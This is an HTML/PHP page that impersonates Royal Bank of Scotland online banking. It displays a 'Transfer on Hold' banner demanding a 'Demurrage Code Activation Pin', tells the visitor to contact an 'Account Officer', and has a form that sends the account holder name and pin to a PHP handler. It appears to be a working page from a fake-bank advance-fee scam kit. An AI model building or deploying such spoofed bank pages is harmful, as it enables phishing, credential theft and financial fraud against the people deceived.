<!doctype html>
<html>
<head>
<link rel="icon" type="png" href="image/rbs-logo.png"style="width:200px;height:200px;"> 
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css" integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
<link rel="stylesheet" href="css/bootstrap.css">
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/style.css">

<SCRIPT language=Javascript>
<!-- Script courtesy of http://www.web-source.net - Your Guide to Professional Web Site Design and Development
var today_date= new Date()
var month=today_date.getMonth()
var today=today_date.getDate()
var year=today_date.getYear()

var months = new Array(
"January",
"February",
"March",
"April",
"May",
"June",
"July",
"August",
"September",
"October",
"November",
"December");
// -->
</SCRIPT>

</head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

<script>
function myFunction() {
  var txt;
  if (confirm("Transfer Now")) {
    txt = window.location.assign("datas_saved.php");
  } else {
    txt = "Sorry For You Cannot Proceed!";
  }
  document.getElementById("demo").innerHTML = txt;
}
</script>
<body>
<?php include 'header.php';?>

<div class="corners">
<div class="container">
<div class="row">
<div class="col-md-5">
<img src="image/rbs_pics.png" style="width:150px; height:45px;"></img>
<hr>
</div>
</div>
</div>
</div>

<div class="dimensions">
<div class="container">
<div class="row">
<div class="col-md-5">
<span style="font-family:kalinga;font-size:15px;color:rgb(102, 204, 102);font-weight:bold;">Online Banking</span>
<hr>
<hr>
</div>
<div class="col-md-2">
</div>
<div class="col-md-5">
<img src="image/6_business_growth_components2.gif" style="width:50%; height:45px;"></img>
</div>
</div>
</div>
</div><br><br>


<html>
<head>
<meta charset="UTF-8">
</head>
<body>


<div class="dimensions">
<div class="container">
<div class="row">
<div class="col-md-12">
<div id="Sign-In" align="center" ><br>
<div style="width:500px;height:400px;border:1px solid #85adad; background-color:white;margin:auto;padding:5px;float:center;"><marquee>
<span style="font-family:kalinga;font-size:20px;"> Transfer on Hold!!! Demurrage Code Activation Pin Is Required:</span><br>
</marquee>
<span style="font-family: kalinga; font-size:20px">You are required to request for Demurrage Code Activation Pin</span><br>
<span style="font-family: kalinga; font-size:20px">Contact Your Account Officer</span>

<marquee>
<span style="font-family:kalinga">Contact your Account Officer</strong></span><br>
</marquee>
<form action="cot_code_otp.php" method="get">
<p style="color:#66a3ff"><span style="font-family:kalinga;font-size:20px;">Login Demurrage Code Activation Pin:</span></p>
<span style="font-family:kalinga;font-size:15px;">Account Holder Name: <i class="fas fa-caret-right"></i> &nbsp &nbsp &nbsp </span><input type="text" name="username" id="user" /><br><br>
<span style="font-family:kalinga;font-size:15px;"> Demurrage Code Activation Pin: <i class="fas fa-caret-right"></i></span>    <input type="password" name="password" id="pass" /><br><br>
<button onclick="myFunction()" class="btn btn-success">
<span style="font-family:kalinga;font-size:15px;">TRANSFER NOW</span>
</button>
</div>
</div>
</div>
</div>
</div>
</div><br><br>

<div style="height:40px;"></div>
<div style="width:1000px;height:5px;border:1px solid rgb(255, 235, 204); background-color:rgb(255, 235, 204);margin:auto;padding:5px;float:center;">
<div class="container">
<div class="row">
<div class="col-md-12">
<ul class="nav">
<li class="nav-item">
 <a class="nav-link"><span style="font-family:calibri;font-size:13px;"> Copyright ©2013-2019 Royal Bank Of Scotland  |</span></a>
 </li>
 <li class="nav-item">
 <a class="nav-link"><span style="font-family:calibri;font-size:13px;"> Terms and Conditions |</span></a>
 </li>
  <li class="nav-item">
 <a class="nav-link"><span style="font-family:calibri;font-size:13px;"> Data Protection and Privacy Policy</span></a>
 </li>
</div>
</div>
</div>
</div>


</body>
</html>


